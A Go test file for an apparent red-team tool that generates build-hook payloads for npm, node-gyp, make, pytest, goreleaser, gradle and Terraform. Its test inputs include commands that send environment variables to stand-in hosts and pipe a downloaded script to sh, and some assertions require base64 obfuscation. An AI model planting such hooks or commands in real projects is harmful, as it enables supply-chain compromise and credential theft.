package payloads

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"
)

func TestGenerateLOTPPayload_UnknownTool(t *testing.T) {
	_, err := GenerateLOTPPayload("frobnicator", "id")
	if err == nil {
		t.Fatal("expected error for unknown tool")
	}
	if !strings.Contains(err.Error(), "unsupported LOTP tool") {
		t.Errorf("unexpected error: %v", err)
	}
}

func TestGenerateLOTPPayload_EmptyCmd(t *testing.T) {
	_, err := GenerateLOTPPayload("npm-gyp", "")
	if err == nil {
		t.Fatal("expected error for empty cmd")
	}
}

// --- Phantom Gyp (npm-gyp) ---

func TestGenerateLOTPPayload_GYP(t *testing.T) {
	const cmd = "printenv | curl -sd @- https://callback.example.com/collect"
	p, err := GenerateLOTPPayload("npm-gyp", cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Tool metadata
	if p.Tool != "npm-gyp" {
		t.Errorf("tool=%q want npm-gyp", p.Tool)
	}
	if len(p.Files) != 2 {
		t.Fatalf("expected 2 files, got %d", len(p.Files))
	}
	if p.Reference == "" {
		t.Error("reference should not be empty")
	}

	byPath := make(map[string]string)
	for _, f := range p.Files {
		byPath[f.Path] = f.Content
	}

	// binding.gyp must contain the gyp command substitution and target name
	gyp, ok := byPath["binding.gyp"]
	if !ok {
		t.Fatal("binding.gyp missing")
	}
	if !strings.Contains(gyp, "<!(node index.js") {
		t.Errorf("binding.gyp missing gyp substitution: %s", gyp)
	}
	if !strings.Contains(gyp, `"targets"`) {
		t.Error("binding.gyp missing targets key")
	}
	if !strings.Contains(gyp, "stub.c") {
		t.Error("binding.gyp should return stub.c to suppress build errors")
	}

	// index.js must reference base64 encoding and contain the encoded command
	indexJS, ok := byPath["index.js"]
	if !ok {
		t.Fatal("index.js missing")
	}
	expectedB64 := base64.StdEncoding.EncodeToString([]byte(cmd))
	if !strings.Contains(indexJS, expectedB64) {
		t.Errorf("index.js does not contain base64-encoded command\nwant substring: %s\ngot: %s", expectedB64, indexJS)
	}
	if !strings.Contains(indexJS, "Buffer.from") {
		t.Error("index.js should decode base64 via Buffer.from")
	}
	if !strings.Contains(indexJS, "execSync") {
		t.Error("index.js should use execSync for command execution")
	}

	// The raw command must NOT appear in index.js in plaintext
	if strings.Contains(indexJS, cmd) {
		t.Error("index.js must not contain the plaintext command (should be base64-encoded)")
	}

	// "gyp" alias should produce the same result
	p2, err := GenerateLOTPPayload("gyp", cmd)
	if err != nil {
		t.Fatalf("gyp alias: unexpected error: %v", err)
	}
	if p2.Tool != "npm-gyp" {
		t.Errorf("gyp alias: tool=%q want npm-gyp", p2.Tool)
	}
	if len(p2.Files) != 2 {
		t.Errorf("gyp alias: expected 2 files, got %d", len(p2.Files))
	}
}

func TestGenerateLOTPPayload_GYP_CaseInsensitive(t *testing.T) {
	for _, tool := range []string{"npm-gyp", "NPM-GYP", "GYP", "Gyp"} {
		p, err := GenerateLOTPPayload(tool, "id")
		if err != nil {
			t.Errorf("tool %q: unexpected error: %v", tool, err)
			continue
		}
		if len(p.Files) != 2 {
			t.Errorf("tool %q: expected 2 files, got %d", tool, len(p.Files))
		}
	}
}

// --- npm postinstall ---

func TestGenerateLOTPPayload_NPM(t *testing.T) {
	const cmd = "curl -s https://attacker.example.com | sh"
	p, err := GenerateLOTPPayload("npm", cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(p.Files) != 1 {
		t.Fatalf("expected 1 file, got %d", len(p.Files))
	}
	if p.Files[0].Path != "package.json" {
		t.Errorf("path=%q want package.json", p.Files[0].Path)
	}

	// Must be valid JSON with postinstall
	var pkg map[string]any
	if err := json.Unmarshal([]byte(p.Files[0].Content), &pkg); err != nil {
		t.Fatalf("package.json is not valid JSON: %v\ncontent: %s", err, p.Files[0].Content)
	}
	scripts, ok := pkg["scripts"].(map[string]any)
	if !ok {
		t.Fatal("package.json missing scripts object")
	}
	if scripts["postinstall"] != cmd {
		t.Errorf("postinstall=%v want %q", scripts["postinstall"], cmd)
	}
}

// --- Makefile ---

func TestGenerateLOTPPayload_Make(t *testing.T) {
	const cmd = "id && hostname"
	p, err := GenerateLOTPPayload("make", cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p.Files[0].Path != "Makefile" {
		t.Errorf("path=%q want Makefile", p.Files[0].Path)
	}
	content := p.Files[0].Content
	if !strings.Contains(content, "$(shell") {
		t.Error("Makefile should use $(shell ...) expansion")
	}
	if !strings.Contains(content, cmd) {
		t.Errorf("Makefile should contain the command %q", cmd)
	}
}

func TestGenerateLOTPPayload_Make_DollarEscape(t *testing.T) {
	// $ in command must be escaped to $$ so make doesn't expand it
	p, err := GenerateLOTPPayload("make", "echo $HOME")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(p.Files[0].Content, "$$HOME") {
		t.Error("$ in command should be escaped to $$ in Makefile")
	}
}

// --- pytest / conftest.py ---

func TestGenerateLOTPPayload_Pytest(t *testing.T) {
	const cmd = "printenv | base64"
	p, err := GenerateLOTPPayload("pytest", cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p.Files[0].Path != "conftest.py" {
		t.Errorf("path=%q want conftest.py", p.Files[0].Path)
	}
	content := p.Files[0].Content
	if !strings.Contains(content, "subprocess") {
		t.Error("conftest.py should import subprocess")
	}
	if !strings.Contains(content, cmd) {
		t.Errorf("conftest.py should contain the command %q", cmd)
	}
}

// --- goreleaser ---

func TestGenerateLOTPPayload_Goreleaser(t *testing.T) {
	const cmd = "id"
	p, err := GenerateLOTPPayload("goreleaser", cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p.Files[0].Path != ".goreleaser.yml" {
		t.Errorf("path=%q want .goreleaser.yml", p.Files[0].Path)
	}
	content := p.Files[0].Content
	if !strings.Contains(content, "before:") {
		t.Error(".goreleaser.yml should contain before: hooks section")
	}
	if !strings.Contains(content, "hooks:") {
		t.Error(".goreleaser.yml should contain hooks:")
	}
	if !strings.Contains(content, cmd) {
		t.Errorf(".goreleaser.yml should contain the command %q", cmd)
	}
}

// --- gradle ---

func TestGenerateLOTPPayload_Gradle(t *testing.T) {
	const cmd = "whoami"
	p, err := GenerateLOTPPayload("gradle", cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p.Files[0].Path != "build.gradle" {
		t.Errorf("path=%q want build.gradle", p.Files[0].Path)
	}
	content := p.Files[0].Content
	if !strings.Contains(content, ".execute()") {
		t.Error("build.gradle should use List.execute() for Groovy command execution")
	}
	if !strings.Contains(content, cmd) {
		t.Errorf("build.gradle should contain the command %q", cmd)
	}
}

// --- terraform ---

func TestGenerateLOTPPayload_Terraform(t *testing.T) {
	const cmd = "env | curl -sd @- https://attacker.example.com"
	for _, tool := range []string{"terraform", "tf"} {
		p, err := GenerateLOTPPayload(tool, cmd)
		if err != nil {
			t.Fatalf("tool %q: unexpected error: %v", tool, err)
		}
		if p.Files[0].Path != "main.tf" {
			t.Errorf("tool %q: path=%q want main.tf", tool, p.Files[0].Path)
		}
		content := p.Files[0].Content
		if !strings.Contains(content, "null_resource") {
			t.Errorf("tool %q: main.tf should contain null_resource", tool)
		}
		if !strings.Contains(content, "local-exec") {
			t.Errorf("tool %q: main.tf should contain local-exec provisioner", tool)
		}
		if !strings.Contains(content, cmd) {
			t.Errorf("tool %q: main.tf should contain the command", tool)
		}
		if !strings.Contains(content, "timestamp()") {
			t.Errorf("tool %q: main.tf should use timestamp() trigger for always_run", tool)
		}
	}
}

// --- KnownLOTPTools completeness check ---

func TestKnownLOTPTools_AllSupported(t *testing.T) {
	// All tools in KnownLOTPTools must be accepted by GenerateLOTPPayload
	for _, tool := range KnownLOTPTools {
		p, err := GenerateLOTPPayload(tool, "id")
		if err != nil {
			t.Errorf("tool %q listed in KnownLOTPTools but GenerateLOTPPayload returned error: %v", tool, err)
			continue
		}
		if len(p.Files) == 0 {
			t.Errorf("tool %q: payload has no files", tool)
		}
		for _, f := range p.Files {
			if f.Path == "" {
				t.Errorf("tool %q: file has empty path", tool)
			}
			if f.Content == "" {
				t.Errorf("tool %q: file %q has empty content", tool, f.Path)
			}
		}
		if p.Description == "" {
			t.Errorf("tool %q: description should not be empty", tool)
		}
		if p.Reference == "" {
			t.Errorf("tool %q: reference should not be empty", tool)
		}
	}
}
